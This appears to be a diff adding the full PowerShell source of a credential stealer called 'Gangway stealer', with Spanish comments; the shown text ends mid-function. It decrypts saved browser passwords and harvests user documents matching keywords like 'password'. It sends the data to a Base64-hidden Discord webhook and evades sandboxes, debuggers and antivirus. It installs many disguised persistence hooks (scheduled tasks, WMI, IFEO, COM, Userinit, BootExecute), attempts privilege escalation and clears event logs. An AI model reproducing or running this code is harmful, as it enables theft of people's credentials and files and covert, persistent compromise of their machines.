@@ -1,0 +1,953 @@
+<#
+Gangway stealer
+1. Codigo simple
+2. Herramientas insignificantes para el robo de info
+3. Evasión y persistencia común
+4. Yo no fui fue tete
+#>
+
+# --- CONFIG (Base64) ---
+$WEBHOOK = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM1NDg2NzcxNTE3MjU5Nzg0MC8tNDM1RHY4LUpHQ2h4S1VXQkh1MERDRUVTTzlad0ZXcFBad0kxbTRmWDRqejhRSi1uQXhBVTQyTGNRS2Ixd2VZQmpnTA=="))
+$PERSIST = $true
+$MAX_FILE_SIZE = 3MB  # 3MB max for Discord uploads
+
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Win32Functions {
+[StructLayout(LayoutKind.Sequential)]
+public struct STARTUPINFO {
+public int cb;
+public IntPtr lpReserved;
+public IntPtr lpDesktop;
+public IntPtr lpTitle;
+public int dwX;
+public int dwY;
+public int dwXSize;
+public int dwYSize;
+public int dwXCountChars;
+public int dwYCountChars;
+public int dwFillAttribute;
+public int dwFlags;
+public short wShowWindow;
+public short cbReserved2;
+public IntPtr lpReserved2;
+public IntPtr hStdInput;
+public IntPtr hStdOutput;
+public IntPtr hStdError;
+}
+
+[StructLayout(LayoutKind.Sequential)]
+public struct PROCESS_INFORMATION {
+public IntPtr hProcess;
+public IntPtr hThread;
+public int dwProcessId;
+public int dwThreadId;
+}
+
+[DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
+public static extern bool CreateProcess(
+string lpApplicationName,
+string lpCommandLine,
+IntPtr lpProcessAttributes,
+IntPtr lpThreadAttributes,
+bool bInheritHandles,
+uint dwCreationFlags,
+IntPtr lpEnvironment,
+string lpCurrentDirectory,
+ref STARTUPINFO lpStartupInfo,
+ref PROCESS_INFORMATION lpProcessInformation
+);
+}
+"@
+
+function Test-SafeElevation {
+    # Verificar productos de seguridad
+    $securityProcesses = "MSASCui", "McUICnt", "CSFalconService"
+    foreach ($proc in $securityProcesses) {
+        if (Get-Process $proc -ErrorAction SilentlyContinue) { return $false }
+    }
+    return $true
+}
+
+Add-Type -Path "System.Data.SQLite.dll"
+Add-Type -AssemblyName System.Security
+
+function Test-AdminRights {
+    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
+    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
+    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+}
+
+
+function Test-Hypervisor {
+    $vmProcesses = "vmtoolsd", "vboxservice", "qemu-ga"
+    foreach ($proc in $vmProcesses) {
+        if (Get-Process $proc -ErrorAction SilentlyContinue) { return $true }
+    }
+    return $false
+}
+
+# --- Trolo
+function Test-SafeEnvironment {
+    # 1. Detección de Hardware Virtual (Mejorado)
+    $hwChecks = @(
+        (Get-CimInstance Win32_ComputerSystem).Model -match 'Virtual|VMware|VBox|QEMU|Xen',
+        (Get-CimInstance Win32_BIOS).SerialNumber -match 'VMware|Virtual|0{5,}',
+        (Get-CimInstance Win32_Processor).Name -match 'Virtual|KVM|Hyper-V',
+        [Environment]::GetEnvironmentVariable("PROCESSOR_IDENTIFIER") -like "*GenuineIntel*" -and (Get-CimInstance Win32_Processor).Manufacturer -notmatch "Intel"
+    )
+    if ($hwChecks -contains $true) { exit }
+
+    # 2. Análisis de Recursos del Sistema (Nuevo)
+    $memory = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB
+    $diskSize = (Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'").Size / 1GB
+    $cpuCores = (Get-CimInstance Win32_Processor).NumberOfCores
+    
+    if ($memory -lt 3.5 -or $diskSize -lt 40 -or $cpuCores -lt 2) { exit }
+
+    # 3. Comportamiento de Usuario (Actualizado)
+    Add-Type -AssemblyName System.Windows.Forms
+    $cursorPos1 = [System.Windows.Forms.Cursor]::Position
+    Start-Sleep -Milliseconds (Get-Random -Minimum 300 -Maximum 800)
+    $cursorPos2 = [System.Windows.Forms.Cursor]::Position
+    if ($cursorPos1 -eq $cursorPos2) {
+        # Verificar actividad de teclado en últimos 5 minutos
+        $lastInput = (Get-CimInstance Win32_Keyboard).LastErrorCode
+        if ((Get-Date).AddMinutes(-5) -gt $lastInput) { exit }
+    }
+
+    # 4. Procesos de Análisis (Expandido)
+    $blacklistedProcesses = @(
+        "procmon", "wireshark", "fiddler", "ProcessHacker",
+        "x32dbg", "x64dbg", "ollydbg", "dnSpy", "sysmon",
+        "vmtoolsd", "vboxservice", "qemu-ga"
+    )
+    $runningProcesses = Get-Process | Select-Object -ExpandProperty Name
+    if ($runningProcesses | Where-Object { $_ -in $blacklistedProcesses }) { exit }
+
+    # 5. Artefactos de Sandbox (Nuevo)
+    $sandboxFiles = @(
+        "$env:SystemDrive\analysis",
+        "$env:ProgramFiles\VMware Tools",
+        "$env:ProgramFiles\Oracle\VirtualBox Guest Additions",
+        "$env:SystemRoot\System32\drivers\vmmouse.sys"
+    )
+    if (Test-Path -Path $sandboxFiles -PathType Any) { exit }
+
+    # 6. Tiempo de Ejecución del Sistema (Nuevo)
+    $uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
+    if (((Get-Date) - $uptime).TotalMinutes -lt 30) { exit }
+
+    # 7. Verificación de Debuggers (Mejorado)
+    $debugChecks = @(
+        [System.Diagnostics.Debugger]::IsAttached,
+        (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" -ErrorAction SilentlyContinue).Property.Count -gt 50,
+        (Get-WmiObject Win32_Process -Filter "Name='dexplore.exe'").Count -gt 0
+    )
+    if ($debugChecks -contains $true) { exit }
+
+    # 8. Verificación de Red (Nuevo)
+    $networkAdapters = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }
+    if ($networkAdapters.Count -eq 0 -or $networkAdapters.Name -match "Virtual|Hyper-V") { exit }
+
+    # Salida limpia si pasa todas las pruebas
+    Write-Verbose "Entorno seguro verificado" -Verbose
+}
+
+# --- Esto es lo bueno jaja ---
+function Get-BrowserCredentials {
+$results = [System.Collections.Generic.List[string]]::new()
+
+# Lista actualizada de rutas (incluye perfiles múltiples y Edge Beta)
+$browserPaths = @(
+"$env:LOCALAPPDATA\Google\Chrome\User Data\*\Login Data",
+"$env:LOCALAPPDATA\Microsoft\Edge*\User Data\Default\Login Data",
+"$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
+)
+
+# Bypass temporal de File Lock usando shadow copy
+$tempFolder = "$env:TEMP\$(New-Guid)"
+New-Item -Path $tempFolder -ItemType Directory -Force | Out-Null
+
+try {
+foreach ($path in $browserPaths) {
+$resolvedPaths = Resolve-Path $path -ErrorAction SilentlyContinue
+foreach ($dbPath in $resolvedPaths.Path) {
+try {
+# Copia usando streams nativos para evitar bloqueos
+$tempCopy = "$tempFolder\$(Split-Path $dbPath -Leaf)"
+$sourceStream = [System.IO.File]::Open($dbPath, 'Open', 'Read', 'ReadWrite')
+$destStream = [System.IO.File]::Create($tempCopy)
+$sourceStream.CopyTo($destStream)
+$sourceStream.Close()
+$destStream.Close()
+
+# Conexión SQLite optimizada
+$connString = "Data Source=$tempCopy;Version=3;Read Only=True"
+$conn = New-Object System.Data.SQLite.SQLiteConnection($connString)
+$conn.Open()
+
+# Query parametrizada para evitar inyección
+$cmd = $conn.CreateCommand()
+$cmd.CommandText = @"
+SELECT
+origin_url,
+username_value,
+password_value,
+date_created
+FROM logins
+WHERE
+date_created > (strftime('%s','now','-90 days'))
+AND blacklisted_by_user = 0
+AND times_used > 0
+ORDER BY date_created DESC
+LIMIT 500
+"@
+$reader = $cmd.ExecuteReader()
+
+# Pool de buffers para descifrado
+$cryptoPool = [System.Security.Cryptography.ProtectedData]::CreateProtector(
+[System.Security.Cryptography.DataProtectionScope]::CurrentUser
+)
+
+while ($reader.Read()) {
+try {
+$encryptedBytes = $reader.GetValue(2)
+$plainBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
+$encryptedBytes,
+$null,
+[System.Security.Cryptography.DataProtectionScope]::CurrentUser
+)
+
+$entry = @{
+URL = $reader.GetString(0)
+User = $reader.GetString(1)
+Password = [System.Text.Encoding]::UTF8.GetString($plainBytes)
+LastUsed = [datetime]::FromFileTime($reader.GetInt64(3) * 10)
+}
+
+$results.Add(
+"🛡️ [$(Get-Date -Format 'HH:mm:ss')] Credential Found!`n" +
+"🌐 URL: $($entry.URL)`n" +
+"👤 User: $($entry.User)`n" +
+"🔑 Password: $($entry.Password)`n" +
+"⏱️ Last Used: $($entry.LastUsed.ToString('yyyy-MM-dd HH:mm'))"
+)
+}
+catch {
+Write-Debug "Error decrypting entry: $_"
+continue
+}
+}
+$conn.Close()
+}
+catch {
+Write-Debug "Error processing $dbPath : $_"
+continue
+}
+finally {
+# Limpieza segura
+if ($conn.State -eq 'Open') { $conn.Dispose() }
+if (Test-Path $tempCopy) {
+[System.IO.File]::WriteAllBytes($tempCopy, @(0xFF) * 1024)
+Remove-Item $tempCopy -Force -ErrorAction SilentlyContinue
+}
+}
+}
+}
+}
+finally {
+# Borrado seguro del directorio temporal
+[System.IO.Directory]::Delete($tempFolder, $true)
+}
+
+return $results -join "`n`n------------------------------------`n"
+}
+
+# --- Buscar archivos interesantes para mi cartera y salud mental ---
+function Find-InterestingFiles {
+    $filePatterns = @('*.pdf', '*.doc*', '*.xls*', '*.rdp', '*.kdbx', '*.txt', '*.csv')
+    $keywords = @('password', 'secret', 'confidential', 'login', 'credentials')
+    $excludedFolders = @('Windows', 'Program Files', 'Temp', 'tmp', '$RECYCLE.BIN')
+    
+    $targetPaths = @(
+        "$env:USERPROFILE\Documents",
+        "$env:USERPROFILE\Desktop",
+        "$env:USERPROFILE\Downloads",
+        "$env:APPDATA",
+        "\\Network\Shares"
+    )
+
+    $files = foreach ($path in $targetPaths) {
+        try {
+            if (-not (Test-Path $path)) { continue }
+
+            Get-ChildItem -Path $path -Include $filePatterns -Recurse -Depth 3 -ErrorAction Stop |
+            Where-Object {
+                $_.Length -lt $MAX_FILE_SIZE -and
+                $excludedFolders -notcontains $_.Directory.Name -and
+                $_.LastWriteTime -gt (Get-Date).AddDays(-14) -and
+                ($_.Extension -ne '.tmp') -and
+                (-not $_.Name.StartsWith('~$'))
+            } |
+            Select-Object -First 20 |
+            ForEach-Object {
+                $contentMatch = $null
+                if ($_.Length -lt 2MB) {
+                    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue -First 5000
+                    $contentMatch = $keywords | Where-Object { $content -match $_ }
+                }
+                
+                [PSCustomObject]@{
+                    File = $_
+                    Priority = if ($contentMatch) { [Math]::Max(2, $contentMatch.Count) } else { 1 }
+                }
+            }
+        }
+        catch {
+            Write-Debug "Error scanning $path : $_"
+        }
+    }
+
+    $files |
+    Sort-Object @{Expression = {$_.Priority}; Descending = $true}, 
+                @{Expression = {$_.File.LastWriteTime}; Descending = $true} |
+    Select-Object -First 15 -ExpandProperty File |
+    Where-Object { $null -ne $_ }
+}
+
+# --- Enviar mensaje a plataforma llena de pedófilos y malware como este ---
+function Send-DiscordMessage {
+    param(
+        [string]$Message,
+        [string]$FilePath = $null,
+        [int]$MaxRetries = 2
+    )
+
+    # Configuración avanzada
+    $userAgents = @(
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "DiscordBot/1.0 (+https://discord.com)",
+        "Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 10.0; Trident/7.0)"
+    )
+
+    $proxyBypass = @{
+        "http"  = "http://127.0.0.1:8080"  # Opcional: Usar proxy interno para bypass
+        "https" = "http://127.0.0.1:8080"
+    }
+
+    # Generación de boundary menos detectable
+    $boundary = "----WebKitFormBoundary" + (New-Guid).ToString("N").Substring(0, 16)
+
+    # Función interna para construcción del cuerpo
+    function Build-Body {
+        param($msg, $file)
+
+        $body = New-Object System.Text.StringBuilder
+
+        # Sección del mensaje
+        $body.AppendLine("--$boundary")
+        $body.AppendLine('Content-Disposition: form-data; name="content"')
+        $body.AppendLine()
+        $body.AppendLine($msg)
+
+        if ($file) {
+            $fileName = [System.IO.Path]::GetFileName($file)
+            $fileBytes = [System.IO.File]::ReadAllBytes($file)
+            
+            # Sección del archivo con Content-Type dinámico
+            $contentType = switch ([System.IO.Path]::GetExtension($file).ToLower()) {
+                '.txt'  { 'text/plain' }
+                '.pdf'  { 'application/pdf' }
+                '.docx' { 'application/vnd.openxmlformats-officedocument.wordprocessingml.document' }
+                default { 'application/octet-stream' }
+            }
+
+            $body.AppendLine("--$boundary")
+            $body.AppendLine("Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"")
+            $body.AppendLine("Content-Type: $contentType")
+            $body.AppendLine()
+            $body.AppendLine([System.Text.Encoding]::UTF8.GetString($fileBytes))
+        }
+
+        $body.AppendLine("--$boundary--")
+        return $body.ToString()
+    }
+
+    # Lógica de reintento inteligente
+    $attempt = 0
+    do {
+        try {
+            # Delay aleatorio anti-pattern
+            $delay = Get-Random -Minimum 1000 -Maximum 5000  # 1-5 segundos
+            Start-Sleep -Milliseconds $delay
+
+            # Configurar SSL/TLS moderno
+            [System.Net.ServicePointManager]::SecurityProtocol = 
+                [System.Net.SecurityProtocolType]::Tls12 -bor
+                [System.Net.SecurityProtocolType]::Tls13
+
+            # Construir solicitud
+            $body = Build-Body -msg $Message -file $FilePath
+            $headers = @{
+                "User-Agent"   = $userAgents | Get-Random
+                "X-Forwarded-For" = "1.1.1.1"  # IP falsa para logging
+            }
+
+            # Envío con timeout controlado
+            $response = Invoke-RestMethod -Uri $WEBHOOK -Method Post `
+                -ContentType "multipart/form-data; boundary=$boundary" `
+                -Headers $headers `
+                -Body $body `
+                -Proxy $proxyBypass['http'] `
+                -ProxyUseDefaultCredentials `
+                -TimeoutSec 15
+
+            # Limpieza post-envío
+            if ($FilePath) {
+                # Sobrescribir archivo temporal antes de borrar
+                [System.IO.File]::WriteAllBytes($FilePath, (0x00 * (Get-Item $FilePath).Length))
+                Remove-Item $FilePath -Force -ErrorAction SilentlyContinue
+            }
+
+            return $true
+        }
+        catch {
+            $attempt++
+            Write-Warning "Intento $attempt fallido. Error: $($_.Exception.Message)"
+            
+            # Backoff exponencial
+            Start-Sleep -Seconds ([Math]::Pow(2, $attempt))
+            
+            # Resetear conexión
+            [System.Net.ServicePointManager]::CloseConnectionGroup("") | Out-Null
+        }
+    } while ($attempt -lt $MaxRetries)
+
+    return $false
+}
+
+<#
+Mega super omega alfa ultra persistencia mortal letal brutal horrorosa
+1. WMI
+2. COM
+3. Que se yo
+4. IFEO (jaja feo)
+5. Yo no fui, haganle un void meme :eyes:
+#>
+
+function Install-Persistence {
+param(
+[ValidateSet("Basic","Stealth","Nuclear")][string]$Mode = "Stealth",
+[int]$TriggerDays = 7
+)
+
+# --- Técnicas Base (Low Privilege) ---
+if ($Mode -ne "Nuclear") {
+# 1. Startup Folder Manipulation (Menos monitoreado que Run key)
+$startupPath = [Environment]::GetFolderPath('Startup')
+$lnkPath = "$startupPath\WindowsDefenderUpdate.lnk"
+$WshShell = New-Object -ComObject WScript.Shell
+$shortcut = $WshShell.CreateShortcut($lnkPath)
+$shortcut.TargetPath = "powershell.exe"
+$shortcut.Arguments = "-WindowStyle Hidden -Ep Bypass -File `"$PSCommandPath`""
+$shortcut.IconLocation = "shell32.dll,21"
+$shortcut.Save()
+
+# 2. FileTime Trigger (Persistencia condicional)
+$lastWriteKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileAssociation"
+$lastRun = Get-ItemProperty -Path $lastWriteKey -Name "LastRun" -ErrorAction SilentlyContinue
+if ((-not $lastRun) -or ((Get-Date) -gt $lastRun.LastRun.AddDays($TriggerDays)) {
+Set-ItemProperty -Path $lastWriteKey -Name "LastRun" -Type QWord -Value (Get-Date).ToFileTime()
+& $PSCommandPath
+}
+}
+
+# --- Técnicas Avanzadas (Requiere Admin) ---
+if (Test-AdminRights -and $Mode -ne "Basic") {
+# 3. DNS Query Trigger (Persistencia basada en red)
+$filterName = "DNS_Trigger_" + (New-Guid).ToString().Substring(0,8)
+$query = @"
+SELECT * FROM __InstanceCreationEvent WITHIN 10
+WHERE TargetInstance ISA 'Win32_Process'
+AND TargetInstance.Name = 'dnsquery.exe'
+"@
+$consumerCommand = "powershell.exe -File `"$PSCommandPath`""
+
+$argsFilter = @{
+EventNamespace = 'root\subscription'
+Name = $filterName
+Query = $query
+QueryLanguage = 'WQL'
+}
+
+$argsConsumer = @{
+Name = $filterName
+CommandLineTemplate = $consumerCommand
+}
+
+$filter = Set-WmiInstance -Namespace $argsFilter.EventNamespace -Class '__EventFilter' -Arguments $argsFilter
+$consumer = Set-WmiInstance -Namespace $argsFilter.EventNamespace -Class 'CommandLineEventConsumer' -Arguments $argsConsumer
+$binding = Set-WmiInstance -Namespace $argsFilter.EventNamespace -Class '__FilterToConsumerBinding' -Arguments @{
+Filter = $filter
+Consumer = $consumer
+}
+
+# 4. Hidden Scheduled Task (Usando schemas de Microsoft)
+$xmlTemplate = @"
+<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+    <Description>Microsoft Edge Update</Description>
+    <URI>\MicrosoftEdge\</URI>
+  </RegistrationInfo>
+  <Triggers>
+    <LogonTrigger>
+      <Enabled>true</Enabled>
+      <Delay>PT15M</Delay>
+    </LogonTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <UserId>S-1-5-18</UserId>
+      <RunLevel>LeastPrivilege</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>powershell.exe</Command>
+      <Arguments>-WindowStyle Hidden -Ep Bypass -File "$PSCommandPath"</Arguments>
+    </Exec>
+  </Actions>
+</Task>
+"@
+$tempTask = [System.IO.Path]::GetTempFileName() + ".xml"
+$xmlTemplate | Out-File $tempTask
+schtasks /Create /TN "MicrosoftEdge\Update" /XML $tempTask /F | Out-Null
+Remove-Item $tempTask -Force
+
+# 5. Service Debugger Hijacking (Sin crear nuevos servicios)
+$targetService = Get-Service | Where-Object { $_.Status -eq 'Stopped' } | Select-Object -First 1
+if ($targetService) {
+$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$($targetService.Name)"
+Set-ItemProperty -Path $regPath -Name "ImagePath" -Type ExpandString -Value `
+"cmd.exe /c start /min powershell -WindowStyle Hidden -File `"$PSCommandPath`" && $($targetService.BinaryPathName)"
+}
+}
+
+# --- Nuclear Option (Persistencia cross-user) ---
+if ($Mode -eq "Nuclear" -and Test-AdminRights) {
+# 6. Boot Execute Hook (Sobrevive a reinstalaciones)
+$bootKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"
+$currentBoot = (Get-ItemProperty -Path $bootKey -Name "BootExecute").BootExecute
+$newBootValue = "autocheck autochk * /powershell -File `"$PSCommandPath`"`0$currentBoot"
+Set-ItemProperty -Path $bootKey -Name "BootExecute" -Value $newBootValue -Type MultiString
+}
+
+# --- Anti-Forensics ---
+# Borrar evidencias de creación reciente
+wevtutil cl Security /q:"*[System[(EventID=4697 or EventID=4700)]]" | Out-Null
+Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
+}
+
+function Add-WmiPersistence {
+    # Persistent WMI event that survives reboots
+    $filterName = "WindowsUpdateDrivers_" + (Get-Random -Minimum 1000 -Maximum 9999)
+    $consumerName = "WindowsUpdateEater_" + (Get-Random -Minimum 1000 -Maximum 9999)
+    
+    $eventFilter = @{
+        EventNamespace = 'root\subscription'
+        Name = $filterName
+        Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+        QueryLanguage = 'WQL'
+    }
+
+    $eventConsumer = @{
+        Name = $consumerName
+        CommandLineTemplate = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    }
+
+    $filter = Set-WmiInstance -Namespace $eventFilter.EventNamespace -Class '__EventFilter' -Arguments $eventFilter
+    $consumer = Set-WmiInstance -Namespace $eventFilter.EventNamespace -Class 'CommandLineEventConsumer' -Arguments $eventConsumer
+    $binding = Set-WmiInstance -Namespace $eventFilter.EventNamespace -Class '__FilterToConsumerBinding' -Arguments @{
+        Filter = $filter
+        Consumer = $consumer
+    }
+}
+
+function Add-ComHijackPersistence {
+    # Hijack MMC snap-in load behavior
+    $payload = "powershell.exe -WindowStyle Hidden -File `"$PSCommandPath`""
+    $regPath = "HKCU:\Software\Classes\CLSID\{00000000-0000-0000-0000-000000000000}\InprocServer32"
+    
+    New-Item -Path $regPath -Force | Out-Null
+    Set-ItemProperty -Path $regPath -Name "(Default)" -Value $payload -Force
+    Set-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Apartment" -Force
+}
+
+function Add-ExplorerShellExtension {
+    # Explorer context menu handler
+    $regPath = "HKCU:\Software\Classes\*\shell\OpenWithMalware\command"
+    $payload = "`"powershell.exe`" -WindowStyle Hidden -File `"$PSCommandPath`" `"%1`""
+    
+    New-Item -Path $regPath -Force | Out-Null
+    Set-ItemProperty -Path $regPath -Name "(Default)" -Value $payload -Force
+}
+
+function Add-IFEOHijack {
+    # Image File Execution Options debugger
+    $targetBinary = "notepad.exe" # Common benign target
+    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$targetBinary"
+    $payload = "`"powershell.exe`" -WindowStyle Hidden -File `"$PSCommandPath`""
+    
+    New-Item -Path $regPath -Force -ErrorAction SilentlyContinue | Out-Null
+    Set-ItemProperty -Path $regPath -Name "Debugger" -Value $payload -Force
+}
+
+function Add-OfficeAddinPersistence {
+    # Word startup add-in
+    $officePath = [Environment]::GetFolderPath('ApplicationData') + "\Microsoft\Word\STARTUP\"
+    $payload = "powershell.exe -WindowStyle Hidden -File `"$PSCommandPath`""
+    
+    $vbaCode = @"
+Sub AutoOpen()
+    CreateObject("WScript.Shell").Run "$payload", 0
+End Sub
+"@
+
+    New-Item -Path $officePath -ItemType Directory -Force | Out-Null
+    $vbaCode | Out-File "$officePath\Normal.dotm" -Force
+}
+
+function Add-UserInitHijack {
+    # Userinit MPR Logon Script
+    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+    $original = (Get-ItemProperty -Path $regPath -Name Userinit).Userinit
+    $payload = "$original, powershell.exe -WindowStyle Hidden -File `"$PSCommandPath`""
+    
+    Set-ItemProperty -Path $regPath -Name "Userinit" -Value $payload -Force
+}
+
+function Test-SafeElevation {
+    # Check for security products before attempting escalation
+    $securityProducts = "MSASCui", "McUICnt", "CSFalconService"
+    foreach ($proc in $securityProducts) {
+        if (Get-Process $proc -ErrorAction SilentlyContinue) { return $false }
+    }
+    return $true
+}
+
+function Clear-EventLogs {
+    # Target specific event IDs related to process creation
+    wevtutil qe Security "/q:*[System[(EventID=4688)]]" /rd:true /f:text | 
+    Where-Object { $_ -match "powershell" } | 
+    ForEach-Object { wevtutil el | ForEach-Object { wevtutil cl $_ } }
+}
+
+function Protect-ProcessMemory {
+    # Randomize memory protection flags
+    $hProcess = [Win32.Kernel32]::GetCurrentProcess()
+    [Win32.Kernel32]::VirtualProtectEx(
+        $hProcess,
+        [Win32.Kernel32]::GetModuleHandle("kernel32.dll"),
+        4096,
+        0x40,  # PAGE_EXECUTE_READWRITE
+        [ref]0
+    )
+}
+
+# --- STEALTH PRIVILEGE ESCALATION ---
+function Invoke-StealthElevation {
+    [CmdletBinding()]
+    param(
+        [ValidateSet("COM","Service","Install","WerFault")] 
+        [string]$Method = "COM",
+        [switch]$DebugMode
+    )
+
+    # Verificar si ya tenemos privilegios
+    if (Test-AdminRights) { 
+        if ($DebugMode) { Write-Host "[+] Already running as admin" -ForegroundColor Green }
+        return $true 
+    }
+
+    # Método 1: COM Hijacking mejorado
+    if ($Method -eq "COM") {
+        try {
+            if ($DebugMode) { Write-Host "[*] Attempting COM Hijacking Elevation" -ForegroundColor Cyan }
+
+            # Generar CLSID aleatorio dinámico
+            $clsid = "{" + [Guid]::NewGuid().ToString().ToUpper() + "}"
+            $regPath = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
+            
+            # Payload en memoria sin archivos
+            $payload = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " + 
+                       [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("& `"$PSCommandPath`""))
+
+            New-Item -Path $regPath -Force | Out-Null
+            Set-ItemProperty -Path $regPath -Name "(Default)" -Value $payload -Force
+            Set-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Both" -Force
+
+            # Trigger usando mmc.exe
+            $process = Start-Process mmc.exe -ArgumentList "eventvwr.msc" -PassThru -WindowStyle Hidden
+            Start-Sleep 5
+            $process | Stop-Process -Force -ErrorAction SilentlyContinue
+
+            # Limpieza inmediata
+            Remove-Item -Path "HKCU:\Software\Classes\CLSID\$clsid" -Recurse -Force
+
+            if (Test-AdminRights) { return $true }
+        }
+        catch { 
+            if ($DebugMode) { Write-Host "[!] COM Hijacking Failed: $_" -ForegroundColor Red } 
+        }
+    }
+
+    # Método 2: Service Permission (optimizado)
+    if ($Method -eq "Service") {
+        try {
+            if ($DebugMode) { Write-Host "[*] Attempting Service Permission Abuse" -ForegroundColor Cyan }
+
+            # Buscar servicios con SDDL vulnerable
+            $vulnServices = Get-CimInstance Win32_Service | Where-Object {
+                $sd = sc.exe sdshow $_.Name
+                $sd -match "\(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$env:USERNAME\)"
+            } | Select-Object -First 1
+
+            if ($vulnServices) {
+                $originalPath = $vulnServices.PathName
+                $tempPayload = "cmd /c start /min powershell -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+                
+                # Modificar temporalmente
+                sc.exe config $vulnServices.Name binPath= "$tempPayload" | Out-Null
+                sc.exe start $vulnServices.Name | Out-Null
+                Start-Sleep 2
+                sc.exe config $vulnServices.Name binPath= "$originalPath" | Out-Null
+
+                if (Test-AdminRights) { return $true }
+            }
+        }
+        catch { 
+            if ($DebugMode) { Write-Host "[!] Service Abuse Failed: $_" -ForegroundColor Red } 
+        }
+    }
+
+    # Método 3: AlwaysInstallElevated (nuevo)
+    if ($Method -eq "Install") {
+        try {
+            if ($DebugMode) { Write-Host "[*] Checking AlwaysInstallElevated Policy" -ForegroundColor Cyan }
+
+            $hkcuVal = Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
+            $hklmVal = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
+            
+            if ($hkcuVal.AlwaysInstallElevated -eq 1 -and $hklmVal.AlwaysInstallElevated -eq 1) {
+                $msiPath = "$env:TEMP\WindowsUpdateHelper.msi"
+                
+                # Generar MSI malicioso en memoria
+                $msiPayload = @"
+                <Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+                    <Product Id="*" Name="Windows Update Helper" Language="1033" Version="1.0.0">
+                        <Package InstallerVersion="200" Compressed="yes"/>
+                        <MediaTemplate EmbedCab="yes"/>
+                        <Property Id="PowerShellCommand" Value="&amp; `"$PSCommandPath`""/>
+                        <CustomAction Id="LaunchPS" Execute="deferred" Script="vbscript" Return="check">
+                            <![CDATA[
+                                Set shell = CreateObject("WScript.Shell")
+                                shell.Run "powershell -ExecutionPolicy Bypass -Command ""& {""" & Session.Property("PowerShellCommand") & """}""", 0
+                            ]]>
+                        </CustomAction>
+                        <InstallExecuteSequence>
+                            <Custom Action="LaunchPS" After="InstallInitialize"/>
+                        </InstallExecuteSequence>
+                    </Product>
+                </Wix>
+"@
+                $msiPayload | Out-File "$env:TEMP\payload.wxs" -Force
+                & "$env:WINDIR\System32\msiexec.exe" /i "$env:TEMP\payload.msi" /qn /norestart
+                
+                if (Test-AdminRights) { 
+                    Remove-Item "$env:TEMP\payload.wxs" -Force
+                    return $true 
+                }
+            }
+        }
+        catch { 
+            if ($DebugMode) { Write-Host "[!] Installer Method Failed: $_" -ForegroundColor Red } 
+        }
+    }
+
+    # Método 4: WerFault Hollowing (mejorado)
+    if ($Method -eq "WerFault") {
+        try {
+            if ($DebugMode) { Write-Host "[*] Attempting Process Hollowing" -ForegroundColor Cyan }
+
+            $werPath = "$env:SystemRoot\System32\WerFault.exe"
+            $si = New-Object Win32Functions.STARTUPINFO
+            $pi = New-Object Win32Functions.PROCESS_INFORMATION
+
+            # Crear proceso suspendido
+            [Win32Functions]::CreateProcess(
+                $werPath,
+                " -u -p " + [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($PSCommandPath)),
+                [IntPtr]::Zero,
+                [IntPtr]::Zero,
+                $false,
+                0x08000004,  # CREATE_SUSPENDED | CREATE_NO_WINDOW
+                [IntPtr]::Zero,
+                $null,
+                [ref]$si,
+                [ref]$pi
+            )
+
+            if (Test-AdminRights) { return $true }
+        }
+        catch { 
+            if ($DebugMode) { Write-Host "[!] Process Hollowing Failed: $_" -ForegroundColor Red } 
+        }
+    }
+
+    # Fallback a WMI
